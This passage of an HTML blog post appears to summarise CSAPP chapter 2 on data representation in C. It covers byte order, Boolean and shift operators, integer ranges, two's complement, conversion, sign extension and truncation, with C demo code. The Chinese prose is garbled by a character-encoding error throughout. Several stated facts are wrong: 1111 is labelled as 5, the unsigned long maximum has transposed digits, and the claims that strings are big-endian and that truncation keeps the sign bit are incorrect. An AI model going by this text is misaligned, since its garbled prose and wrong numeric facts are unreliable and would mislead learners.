class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> x=<span class="hljs-number">0x00003039</span>;   <span class="hljs-comment">//åè¿›åˆ¶12345è½¬æ¢ä¸ºåå…­è¿›åˆ¶3039</span><br>    show_bytes(&amp;x,<span class="hljs-keyword">sizeof</span>(x));<br>    <span class="hljs-type">float</span> y=x;<br>    show_bytes(&amp;y,<span class="hljs-keyword">sizeof</span>(y));<br>&#125;<br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœå¦‚ä¸‹</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">39 30 00 00 <br>00 e4 40 46<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è™½ç„¶ä¸¤ç§ç±»å‹çš„æ•°æ®éƒ½æ˜¯å¯¹ 12345 ç¼–ç ï¼Œä½†ä»–ä»¬æœ‰ä¸åŒçš„å­—èŠ‚æ¨¡å¼ã€‚æµ®ç‚¹æ•°çš„è¾“å‡ºåœ¨æ•´æ•°å½¢æ€ä¸‹ä¸º <code>0x4640E400</code>ï¼Œä¸æ•´æ•°çš„å­˜å‚¨æœ‰ç€æˆªç„¶ä¸åŒçš„ç»“æœã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬å¯¹è¿™ä¸ªç»“æœçš„äºŒè¿›åˆ¶é€‚å½“ç§»ä½ï¼Œå°±ä¼šå‘ç°å®ƒä»¬æœ‰13ä¸ªç›¸åŒ¹é…çš„ä½ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>   <span class="hljs-number">0</span>   <span class="hljs-number">0</span>    <span class="hljs-number">0</span>   <span class="hljs-number">3</span>   <span class="hljs-number">0</span>   <span class="hljs-number">3</span>   <span class="hljs-number">9</span><br><span class="hljs-attribute">000000000</span> <span class="hljs-number">0000000001000000111001</span><br>            <span class="hljs-attribute">4</span>   <span class="hljs-number">6</span>   <span class="hljs-number">4</span>   <span class="hljs-number">0</span>   E    <span class="hljs-number">4</span>   <span class="hljs-number">0</span>   <span class="hljs-number">0</span><br>          <span class="hljs-attribute">0100011001000000111001</span> <span class="hljs-number">0000000000</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¢å…¶ä»–çš„æ•°æ®å†æ¬¡å°è¯•å°±å¯ä»¥å‘ç°ï¼ŒåŒ¹é…çš„æ€»æ˜¯ int å‹çš„ä½ä½ï¼Œä½†åŒ¹é…ä½æ•°ä¸å›ºå®šï¼Œfloatå‹çš„åŒ¹é…éƒ¨åˆ†ä¹Ÿä¸æ˜¯æ€»æ˜¯ä»æœ€é«˜ä½å¼€å§‹ã€‚</p><blockquote><p>åŸå› æ˜¯æµ®ç‚¹æ•°çš„å°¾æ•°åŸºæœ¬æ˜¯å’ŒåŸäºŒè¿›åˆ¶çš„å€¼ä¸€è‡´çš„ï¼Œæ¥ä¸‹æ¥æµ®ç‚¹æ•°éƒ¨åˆ†ä¼šæœ‰ç›¸å…³åŸç†è§£é‡Š</p></blockquote><h3 id="è¡¨ç¤ºå­—ç¬¦ä¸²"><a href="#è¡¨ç¤ºå­—ç¬¦ä¸²" class="headerlink" title="è¡¨ç¤ºå­—ç¬¦ä¸²"></a>è¡¨ç¤ºå­—ç¬¦ä¸²</h3><p>åœ¨Cè¯­è¨€ä¸­ï¼Œå­—ç¬¦ä¸²è¢«ç¼–ç ä¸ºä»¥ NULL ç»“å°¾çš„å­—ç¬¦æ•°ç»„ï¼Œå­—ç¬¦å¸¸ç”¨ ASCII å­—ç¬¦ç ç¼–ç è¡¨ç¤ºã€‚</p><p>å­—ç¬¦ä¸²æ•°ç»„æ˜¯ä»¥å¤§ç«¯åºå‚¨å­˜çš„ï¼Œæ¯”å¦‚æˆ‘ä»¬å­˜å‚¨ä¸€ä¸ªå­—ç¬¦ä¸² <code>char s[] = &quot;12345&quot;</code>ï¼Œé‚£ä¹ˆå®é™…ä¸Šçš„å­˜å‚¨é¡ºåºå°±æ˜¯ <code>s[0]=&#39;1&#39;,s[1]=&#39;2&#39;,s[2]=&#39;3&#39;,s[3]=&#39;4&#39;,s[4]=&#39;5&#39;,s[5]=&#39;null&#39;</code>ã€‚éœ€è¦æ³¨æ„ï¼Œå°±ç®—æˆ‘ä»¬åœ¨ç¼–å†™å­˜å‚¨å­—ç¬¦ä¸²æ—¶å¹¶æ²¡æœ‰ç¼–å†™æœ«å°¾çš„ç©ºå­—èŠ‚ï¼Œæœºå™¨ä¹Ÿä¼šè‡ªåŠ¨è¡¥å……åœ¨å­—ç¬¦ä¸²çš„æœ«å°¾ä¹Ÿå°±æ˜¯æœ€é«˜ä½ä¸Šã€‚</p><p>ç©ºå­—èŠ‚è¢«åŒ…å«åœ¨å­—ç¬¦ä¸²å½“ä¸­ï¼Œæˆ‘ä»¬åœ¨é™åˆ¶å­—ç¬¦ä¸²è¾“å…¥é•¿åº¦æ—¶éœ€è¦æ³¨æ„é˜²æ­¢æº¢å‡ºã€‚</p><h3 id="è¡¨ç¤ºä»£ç "><a href="#è¡¨ç¤ºä»£ç " class="headerlink" title="è¡¨ç¤ºä»£ç "></a>è¡¨ç¤ºä»£ç </h3><p>ä¸åŒæœºå™¨ç±»å‹ä½¿ç”¨ä¸åŒä¸”ä¸å…¼å®¹çš„æŒ‡ä»¤å’Œç¼–ç æ–¹å¼ï¼ŒäºŒè¿›åˆ¶ç æ˜¯ä¸å…¼å®¹çš„ã€‚</p><p>ä»æœºå™¨çš„è§’åº¦æ¥çœ‹ï¼Œç¨‹åºå°±ä»…ä»…æ˜¯å­—èŠ‚åºåˆ—ï¼Œä¸ä¼šæœ‰ç‰¹å®šçš„ä¿¡æ¯æ¥æŒ‡ç¤ºæºç¨‹åºã€‚</p><h3 id="å¸ƒå°”ä»£æ•°ç®€ä»‹"><a href="#å¸ƒå°”ä»£æ•°ç®€ä»‹" class="headerlink" title="å¸ƒå°”ä»£æ•°ç®€ä»‹"></a>å¸ƒå°”ä»£æ•°ç®€ä»‹</h3><p>å¸ƒå°”ä»£æ•°æ˜¯åœ¨äºŒå…ƒé›†åˆ <code>&#123;0ï¼Œ1&#125;</code> åŸºç¡€ä¸Šçš„å®šä¹‰ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šæˆ‘ä»¬å¯ä»¥è¿›è¡Œç›¸å…³çš„è¿ç®—ã€‚</p><ul><li><p>ä¸</p><p>1ä¸1ä¸º1ï¼Œ1ä¸0ä¸º0ï¼Œ0ä¸1ä¸º0ï¼Œ0ä¸0ä¸º0</p></li><li><p>æˆ–</p><p>1æˆ–1ä¸º1ï¼Œ1æˆ–0ä¸º1ï¼Œ0æˆ–1ä¸º1ï¼Œ0æˆ–0ä¸º0</p></li><li><p>é</p><p>é0ä¸º1ï¼Œé1ä¸º0</p></li><li><p>äº¦æˆ–</p><p>1å¼‚æˆ–1ä¸º0ï¼Œ1å¼‚æˆ–0ä¸º1ï¼Œ0å¼‚æˆ–1ä¸º1ï¼Œ0å¼‚æˆ–0ä¸º0</p></li></ul><h3 id="Cè¯­è¨€ä¸­çš„è¿ç®—"><a href="#Cè¯­è¨€ä¸­çš„è¿ç®—" class="headerlink" title="Cè¯­è¨€ä¸­çš„è¿ç®—"></a>Cè¯­è¨€ä¸­çš„è¿ç®—</h3><h4 id="ä½çº§è¿ç®—"><a href="#ä½çº§è¿ç®—" class="headerlink" title="ä½çº§è¿ç®—"></a>ä½çº§è¿ç®—</h4><p>Cè¯­è¨€æ”¯æŒæŒ‰ä½çš„å¸ƒå°”è¿ç®—ï¼Œæ¯ä¸€ä½ä¹‹é—´ç‹¬ç«‹çš„è¿›è¡Œè¿ç®—ã€‚ä¾‹å¦‚å‘é‡ <code>[a,b,â€¦,c]</code> å’Œ <code>[A,B,â€¦,C]</code> ï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠŠæ¯ä¸€ä½å…ƒç´ æ‹¿å‡ºæ¥å•ç‹¬è¿›è¡Œè¿ç®—ï¼Œæ¯ä¸€ä½ç»“æœä¸ºæ–°å‘é‡å¯¹åº”ä½çš„ç»“æœã€‚</p><p>åœ¨ C è¯­è¨€ä¸­ï¼Œä»¥ä¸Šé€»è¾‘è¿ç®—å¯¹åº”çš„ç¬¦å·åˆ†åˆ«ä¸ºï¼š</p><ul><li>éï¼š~</li><li>ä¸ï¼š&amp;</li><li>æˆ–ï¼š|</li><li>å¼‚æˆ–ï¼š^</li></ul><h5 id="é€»è¾‘è¿ç®—"><a href="#é€»è¾‘è¿ç®—" class="headerlink" title="é€»è¾‘è¿ç®—"></a>é€»è¾‘è¿ç®—</h5><p>C è¯­è¨€ä¸­æˆ‘ä»¬ç”¨ bool ç±»å‹æ¥è¡¨ç¤ºé€»è¾‘è¿ç®—ç»“æœï¼Œ<code>true </code>è¡¨ç¤º <code>çœŸ(1)</code>ï¼Œ<code>false </code> è¡¨ç¤º <code>å‡(0)</code> ã€‚é€»è¾‘è¿ç®—æœ‰å•ç‹¬çš„è¿ç®—ç¬¦ï¼š</p><ul><li><code>&amp;&amp;</code>ï¼ˆé€»è¾‘ä¸ï¼‰ï¼šå¦‚æœä¸¤ä¸ªæ“ä½œæ•°éƒ½ä¸ºçœŸï¼Œåˆ™ç»“æœä¸ºçœŸï¼›å¦åˆ™ï¼Œç»“æœä¸ºå‡ã€‚</li><li><code>||</code>ï¼ˆé€»è¾‘æˆ–ï¼‰ï¼šå¦‚æœè‡³å°‘æœ‰ä¸€ä¸ªæ“ä½œæ•°ä¸ºçœŸï¼Œåˆ™ç»“æœä¸ºçœŸï¼›å¦‚æœä¸¤ä¸ªæ“ä½œæ•°éƒ½ä¸ºå‡ï¼Œåˆ™ç»“æœä¸ºå‡ã€‚</li><li><code>!</code>ï¼ˆé€»è¾‘éï¼‰ï¼šç”¨äºå–åæ“ä½œæ•°çš„å€¼ï¼Œå¦‚æœæ“ä½œæ•°ä¸ºçœŸï¼Œåˆ™å–ååä¸ºå‡ï¼Œå¦‚æœæ“ä½œæ•°ä¸ºå‡ï¼Œåˆ™å–ååä¸ºçœŸã€‚</li></ul><blockquote><p>bool æ•°æ®åœ¨è¿›è¡Œè¿ç®—æ—¶ï¼Œä¼šæŠŠæ‰€æœ‰å‚ä¸è¿ç®—çš„å€¼è½¬ä¸º <code>bool</code> ç±»å‹ï¼Œ<code>0</code> å°±æ˜¯ <code>0</code>ï¼Œä¸æ˜¯ <code>0</code> ä¸€å¾‹éƒ½æ˜¯ <code>1</code>ã€‚</p></blockquote><h4 id="ç§»ä½è¿ç®—"><a href="#ç§»ä½è¿ç®—" class="headerlink" title="ç§»ä½è¿ç®—"></a>ç§»ä½è¿ç®—</h4><p>ç§»ä½è¿ç®—åˆ†ä¸ºå·¦ç§»å’Œå³ç§»ï¼Œåˆ†åˆ«ç”¨ç¬¦å· <code>&lt;&lt;</code> å’Œ <code>&gt;&gt;</code> è¡¨ç¤ºã€‚</p><p>å‡è®¾æ•´æ•° <em>X</em> ä¸€å…± w ä½ï¼Œ<code>X&gt;&gt;k</code> å³ç§» k ä½è¡¨ç¤ºä¸¢å¼ƒä½ k ä½ï¼ŒåŸæ¥çš„é«˜ <code>w-k</code> ä½å˜ä¸ºä½ <code>w-k</code> ä½ï¼Œé«˜ <code>k</code> ä½å˜ä¸º0ã€‚<code>X&lt;&lt;k</code> å·¦ç§» k ä½è¡¨ç¤ºä¸¢å¼ƒé«˜ k ä½ï¼ŒåŸæ¥çš„ä½ <code>w-k</code> ä½å˜ä¸ºé«˜ <code>w-k</code> ä½ï¼Œä½ <code>k</code> ä½å˜ä¸º0ã€‚</p><p>å…¶ä¸­å³ç§»è¿ç®—åˆåˆ†ä¸º<strong>ç®—æœ¯å³ç§»</strong>å’Œ<strong>é€»è¾‘å³ç§»</strong>ã€‚äºŒè€…ä¹‹é—´çš„å·®å¼‚å°±æ˜¯é«˜ä½å¡«å……å€¼çš„ä¸åŒï¼Œç®—æœ¯å³ç§»å¤åˆ¶æœ€é«˜ä½ï¼Œé€»è¾‘å³ç§»å¡«å……0ã€‚</p><p>ç”±äºç®—æœ¯å³ç§»çš„é«˜ä½å¡«å……çš„æ˜¯åŸæœ¬çš„æœ€é«˜ä½å€¼è€Œä¸æ˜¯0ï¼Œæ‰€ä»¥<strong>ç®—æœ¯å³ç§»ç”¨äºå¤„ç†å¸¦ç¬¦å·æ•´æ•°ï¼Œé€»è¾‘å³ç§»ç”¨äºå¤„ç†æ— ç¬¦å·æ•´æ•°</strong>ã€‚</p><h2 id="æ•´æ•°è¡¨ç¤º"><a href="#æ•´æ•°è¡¨ç¤º" class="headerlink" title="æ•´æ•°è¡¨ç¤º"></a>æ•´æ•°è¡¨ç¤º</h2><h3 id="æ•´æ•°æ•°æ®ç±»å‹"><a href="#æ•´æ•°æ•°æ®ç±»å‹" class="headerlink" title="æ•´æ•°æ•°æ®ç±»å‹"></a>æ•´æ•°æ•°æ®ç±»å‹</h3><p>Cè¯­è¨€æœ‰å¤šç§ä¸åŒçš„æ•´æ•°æ•°æ®ç±»å‹ï¼Œç”¨æ¥è¡¨ç¤ºä¸åŒèŒƒå›´çš„æ•´æ•°ã€‚æ¯ä¸€ç§ç±»å‹éƒ½å¯ä»¥ç”¨å…³é”®å­—æ¥æŒ‡å®šå¤§å°ä»¥åŠæ•°å­—çš„æ­£è´Ÿã€‚æ ¹æ®å­—èŠ‚åˆ†é…ï¼Œä¸åŒçš„å¤§å°æ‰€èƒ½è¡¨ç¤ºçš„å€¼çš„èŒƒå›´ä¸åŒï¼Œå…·ä½“å¦‚ä¸‹è¡¨ï¼š</p><blockquote><p>64ä½å’Œ32ä½åªç”¨longæŒ‡ç¤ºç¬¦çš„å–å€¼èŒƒå›´ä¸åŒï¼Œæ‹¬å·å†…ä¸º32ä½å¯¹åº”çš„å–å€¼èŒƒå›´</p></blockquote><table><thead><tr><th>Cæ•°æ®ç±»å‹</th><th>æœ€å°å€¼</th><th>æœ€å¤§å€¼</th></tr></thead><tbody><tr><td>char</td><td>-128</td><td>127</td></tr><tr><td>unsigned char</td><td>0</td><td>255</td></tr><tr><td>short</td><td>-32768</td><td>32767</td></tr><tr><td>unsigned short</td><td>0</td><td>65535</td></tr><tr><td>int</td><td>-2147483648</td><td>2147483647</td></tr><tr><td>unsigned</td><td>0</td><td>4294967295</td></tr><tr><td>long</td><td>-9223372036854775808 (-2147483648)</td><td>9223372036854775807 (2147483647)</td></tr><tr><td>unsigned long</td><td>0</td><td>18446744037709551615 (4294967295)</td></tr></tbody></table><p>å¦‚ä¸Šè¡¨æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œæœ‰ç¬¦å·çš„æ•°æ®ç±»å‹åœ¨æ­£æ•°å’Œè´Ÿæ•°çš„èŒƒå›´å¹¶ä¸ä¸¥æ ¼å¯¹ç§°ï¼Œè´Ÿæ•°èŒƒå›´æ€»æ˜¯æ¯”æ­£æ•°å¤§1ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œé€šå¸¸Cè¯­è¨€ä¸­<strong>å¤§å¤šæ•°çš„æ•°å­—éƒ½é»˜è®¤ä¸ºæœ‰ç¬¦å·</strong>ï¼Œè¦åˆ›å»ºæ— ç¬¦å·å¸¸é‡å¿…é¡»åŠ ä¸Šåç¼€å­—ç¬¦ <code>&#39;u&#39;</code> æˆ– <code>&#39;U&#39;</code>ã€‚ä¾‹å¦‚å£°æ˜ <code>12345</code> è¿™æ ·çš„å¸¸é‡å°±è¢«è®¤ä¸ºæ˜¯æœ‰ç¬¦å·çš„ï¼Œ <code>0x12b4u</code> æ‰ä¼šè¢«è®¤ä¸ºæ˜¯æ— ç¬¦å·å¸¸é‡ã€‚</p><h4 id="æ— ç¬¦å·æ•°çš„ç¼–ç "><a href="#æ— ç¬¦å·æ•°çš„ç¼–ç " class="headerlink" title="æ— ç¬¦å·æ•°çš„ç¼–ç "></a>æ— ç¬¦å·æ•°çš„ç¼–ç </h4><p>æ— ç¬¦å·æ•°å®é™…ä¸Šå°±æ˜¯éè´Ÿæ•°ï¼Œå°±æ˜¯åªåŒ…æ‹¬æ­£æ•°å’Œ 0 çš„éƒ¨åˆ†ã€‚æ— ç¬¦å·æ•°æ²¡æœ‰ç¬¦å·ä½ï¼Œå› æ­¤ä»–ä»¬çš„ç¼–ç èŒƒå›´å§‹ç»ˆä» 0 å¼€å§‹ã€‚</p><p>æ— ç¬¦å·æ•´æ•°çš„ç¼–ç æ–¹æ³•é€šå¸¸åŸºäºäºŒè¿›åˆ¶è¡¨ç¤ºï¼Œæ¯ä½ï¼ˆæˆ–ä½ç»„åˆï¼‰å¯ä»¥è¡¨ç¤º 2 ä¸ªå¯èƒ½çš„å€¼ï¼š0å’Œ1ã€‚ç¼–ç ä¸­æ²¡æœ‰ç¬¦å·ä½ï¼Œ<strong>æœ€é«˜ä½é€šå¸¸æ˜¯æœ€é«˜æœ‰æ•ˆä½</strong>ï¼Œè¡¨ç¤ºæœ€å¤§çš„æƒå€¼ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BF%A1%E6%81%AF%E5%AD%98%E5%82%A8-%E6%80%BB%E7%BB%93/2-%E6%97%A0%E7%AC%A6%E5%8F%B7%E7%BC%96%E7%A0%81.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">4</span>ä½äºŒè¿›åˆ¶ç¼–ç ï¼š<span class="hljs-number">0000</span> (<span class="hljs-number">0</span>), <span class="hljs-number">1001</span> (<span class="hljs-number">9</span>), <span class="hljs-number">1111</span> (<span class="hljs-number">5</span>)<br><span class="hljs-attribute">8</span>ä½äºŒè¿›åˆ¶ç¼–ç ï¼š<span class="hljs-number">00000000</span> (<span class="hljs-number">0</span>), <span class="hljs-number">01011010</span> (<span class="hljs-number">90</span>), <span class="hljs-number">11111111</span> (<span class="hljs-number">255</span>)<br></code></pre></td></tr></table></figure><blockquote><p>å°±æ˜¯æœ€ç®€å•çš„æ­£å¸¸äºŒè¿›åˆ¶è¡¨ç¤ºæ–¹æ³• </p></blockquote><h4 id="è¡¥ç ç¼–ç "><a href="#è¡¥ç ç¼–ç " class="headerlink" title="è¡¥ç ç¼–ç "></a>è¡¥ç ç¼–ç </h4><p>å®é™…è¿ç”¨ä¸­ä¸ä»…åªæœ‰æ­£æ•°æ•°æ®ï¼Œæˆ‘ä»¬è¿˜æƒ³è¦å®ç°è´Ÿæ•°å€¼ï¼Œè¡¥ç å°±æ˜¯æœ€å¸¸è§çš„è´Ÿæ•°è¡¨ç¤ºæ–¹æ³•ã€‚</p><p>åœ¨è¡¥ç çš„å®šä¹‰ä¸­ï¼Œ<strong>å­—çš„æœ€é«˜ä½ä¸ºç¬¦å·ä½</strong>ã€‚ç¬¦å·ä½ä¸º0è¡¨ç¤ºæ­£æ•°ï¼Œç¬¦å·ä½ä¸º1è¡¨ç¤ºè´Ÿæ•°ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">8</span>ä½äºŒè¿›åˆ¶è¡¥ç ï¼š <span class="hljs-number">00000000</span> (<span class="hljs-number">0</span>), <span class="hljs-number">00000101</span> (<span class="hljs-number">5</span>), <span class="hljs-number">11111011</span> (-<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><p>åœ¨å•çº¯çš„äºŒè¿›åˆ¶æ•°å­—å±‚é¢ï¼Œç”±äºæœ€é«˜ä½æ˜¯æœ€é«˜æƒå€¼ï¼Œæ‰€ä»¥åœ¨ä½æ•°ç›¸åŒçš„æƒ…å†µä¸‹ï¼Œæœ€é«˜ä½æ˜¯ 1 çš„äºŒè¿›åˆ¶æ•°æ°¸è¿œå¤§äºæœ€é«˜ä½æ˜¯ 0 çš„äºŒè¿›åˆ¶æ•°ã€‚å› æ­¤æ­£è´Ÿæ•°è¡¥ç å¯¹åº”çš„äºŒè¿›åˆ¶èŒƒå›´æ˜¯æ²¡æœ‰äº¤é›†çš„ï¼Œæ‰€ä»¥æ— è®ºå…¶ä»–ä½å¦‚ä½•å˜åŒ–éƒ½ä¸ä¼šä½¿æŸä¸ªæ•°æ®çš„æ­£è´Ÿæ··æ·†ã€‚</p><h3 id="æœ‰ç¬¦å·æ•°ä¸æ— ç¬¦å·æ•°çš„è½¬æ¢"><a href="#æœ‰ç¬¦å·æ•°ä¸æ— ç¬¦å·æ•°çš„è½¬æ¢" class="headerlink" title="æœ‰ç¬¦å·æ•°ä¸æ— ç¬¦å·æ•°çš„è½¬æ¢"></a>æœ‰ç¬¦å·æ•°ä¸æ— ç¬¦å·æ•°çš„è½¬æ¢</h3><p>æœ‰ç¬¦å·æ•°å’Œæ— ç¬¦å·æ•°ä¹‹é—´çš„è½¬æ¢åˆ†ä¸ºä¸¤ç§ï¼šæ˜¾ç¤ºè½¬æ¢å’Œéšå¼è½¬æ¢ã€‚</p><p><strong>æ˜¾ç¤ºè½¬æ¢</strong>ä¹Ÿç§°å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œéœ€è¦ä½¿ç”¨ç‰¹å®šçš„è¯­æ³•å’Œç±»å‹è½¬æ¢æ“ä½œç¬¦ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> signedValue;<br><span class="hljs-type">unsigned</span> unsignedValue ;<br><br>signedValue = (<span class="hljs-type">int</span>) unsignedValue ; <br>unsignedValue = (<span class="hljs-type">unsigned</span>) signedValue;<br></code></pre></td></tr></table></figure><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ˜¾ç¤ºè½¬æ¢å¯èƒ½å¯¼è‡´æ•°æ®æˆªæ–­æˆ–æ•°æ®ä¸¢å¤±ã€‚</p></blockquote><p><strong>éšå¼è½¬æ¢</strong>ä¹Ÿç§°ä¸ºè‡ªåŠ¨ç±»å‹è½¬æ¢æˆ–è‡ªåŠ¨å‡çº§ï¼Œç”±ç¼–è¯‘å™¨è‡ªåŠ¨æ‰§è¡Œï¼Œä»¥ä½¿è¡¨è¾¾å¼æˆ–æ“ä½œèƒ½å¤ŸæˆåŠŸè¿›è¡Œã€‚</p><p>ä¾‹å¦‚ï¼Œå°†ä¸€ç§ç±»å‹çš„è¡¨è¾¾å¼èµ‹å€¼ç»™å¦å¤–ä¸€ç§ç±»å‹çš„å˜é‡ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æ‰§è¡Œéšå¼è½¬æ¢ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> signedValue;<br><span class="hljs-type">unsigned</span> unsignedValue ;<br><br>signedValue = unsignedValue ; <br>unsignedValue = signedValue;<br></code></pre></td></tr></table></figure><p>ä¸åŒç±»å‹çš„å˜é‡è¿›è¡Œè¿ç®—æ—¶å‘ç”Ÿçš„ä¹Ÿæ˜¯éšå¼è½¬æ¢ã€‚</p><p>éšå¼è½¬æ¢åŸåˆ™ï¼š</p><ul><li><p>åœ¨æ··åˆä½¿ç”¨æµ®ç‚¹æ•°å’Œæ•´æ•°ç±»å‹æ—¶ï¼Œé€šå¸¸å°†æ•´æ•°æå‡ä¸ºæµ®ç‚¹æ•°ï¼Œå‡ºç°è¿‡doubleåˆ™ç»“æœä¸€å®šä¸ºdouble</p></li><li><p>è‹¥éƒ½æ˜¯æ•´æ•°å‚ä¸è¿ç®—åˆ™ç»“æœä¹Ÿæ˜¯æ•´æ•°</p></li><li><p>æ•´æ•°è¿ç®—çš„ç»“æœä¸ºå‡ºç°è¿‡çš„ä½æ•°æœ€å¤§çš„æ•´æ•°ï¼Œè‹¥æœ€å¤§çš„æ•´æ•°ä¸­æœ‰æ— ç¬¦å·ç±»å‹çš„åˆ™ç»“æœæ— ç¬¦å·ã€‚</p></li></ul><h3 id="æ‰©å±•ä¸€ä¸ªæ•°å­—çš„ä½è¡¨ç¤º"><a href="#æ‰©å±•ä¸€ä¸ªæ•°å­—çš„ä½è¡¨ç¤º" class="headerlink" title="æ‰©å±•ä¸€ä¸ªæ•°å­—çš„ä½è¡¨ç¤º"></a>æ‰©å±•ä¸€ä¸ªæ•°å­—çš„ä½è¡¨ç¤º</h3><p>è¦å°†æ— ç¬¦å·æ•°è½¬åŒ–æˆä¸€ä¸ªæ›´å¤§çš„æ•°æ®ç±»å‹ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨å¼€å¤´æ·»åŠ  <code>0</code> å³å¯ã€‚è¿™ç§è¿ç®—ç§°ä¸º <strong>0 æ‰©å±•</strong>ã€‚</p><p>ä½†æ˜¯å¦‚æœæ˜¯å°†è¡¥ç æ•°å­—è½¬æ¢ä¸ºæ›´å¤§çš„æ•°æ®ç±»å‹ï¼Œå°†ä¼šæ‰§è¡Œ<strong>ç¬¦å·æ‰©å±•</strong>ï¼Œéè´Ÿæ•°å¼€å¤´æ·»åŠ  <code>0</code> ï¼Œè´Ÿæ•°åˆ™éœ€è¦å¼€å¤´æ·» <code>1</code>ã€‚</p><p>æˆ‘ä»¬è¿è¡Œä¸‹é¢çš„ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">show_bytes</span><span class="hljs-params">(<span class="hljs-type">void</span> *start,<span class="hljs-type">size_t</span> len)</span>&#123;    <br>    <span class="hljs-type">size_t</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.2x &quot;</span>,*(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(start+i));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">short</span> x=<span class="hljs-number">0x1234</span>;<br>    <span class="hljs-type">short</span> y=<span class="hljs-number">-0x1234</span>;<br>    show_bytes(&amp;x,<span class="hljs-keyword">sizeof</span>(x));<br>    show_bytes(&amp;y,<span class="hljs-keyword">sizeof</span>(y));<br>    <span class="hljs-type">int</span> x1=x;<br>    <span class="hljs-type">int</span> y1=y;<br>    show_bytes(&amp;x1,<span class="hljs-keyword">sizeof</span>(x1));<br>    show_bytes(&amp;y1,<span class="hljs-keyword">sizeof</span>(y1));<br>&#125;<br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœä¸ºï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">34 12 <br>cc ed<br>34 12 00 00<br>cc ed ff ff<br></code></pre></td></tr></table></figure><h3 id="æˆªæ–­æ•°å­—"><a href="#æˆªæ–­æ•°å­—" class="headerlink" title="æˆªæ–­æ•°å­—"></a>æˆªæ–­æ•°å­—</h3><p>æˆ‘ä»¬éœ€è¦å‡å°‘ä¸€ä¸ªæ•°å­—çš„ä½æ•°æ—¶å°±éœ€è¦æˆªæ–­æ•°å­—ï¼Œå½“æˆ‘ä»¬å°† w ä½çš„æ•°å­—æˆªæ–­ä¸º k ä½æ•°å­—æ—¶ï¼Œæˆ‘ä»¬å°±ä¼šä¸¢å¼ƒæœ‰æ•ˆä½çš„é«˜ <code>w-k</code> ä½ï¼Œè¡¥ç æ•°å­—çš„ç¬¦å·ä½æ˜¯å§‹ç»ˆä¸å˜çš„ã€‚</p><p>éœ€è¦æ³¨æ„æœ‰ç¬¦å·æ•°çš„é˜¶æ®µå¯èƒ½ä¼šå‘ç”Ÿæº¢å‡ºç°è±¡ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ª8ä½å¸¦ç¬¦å·æ•´æ•°ï¼Œå…¶èŒƒå›´æ˜¯ä» -128 åˆ° 127ã€‚å¦‚æœåŸå§‹å¸¦ç¬¦å·æ•´æ•°ä¸º -150ï¼Œå°†å…¶æˆªæ–­ä¸º 8 ä½å¸¦ç¬¦å·æ•´æ•°ä¼šå¯¼è‡´æº¢å‡ºï¼Œå› ä¸º -150 ä¸åœ¨ -128 åˆ° 127 çš„èŒƒå›´å†…ã€‚æˆªæ–­åçš„ç»“æœå¯èƒ½æ˜¯æ­£æ•° 106ï¼Œè¿™æ˜¯ -150 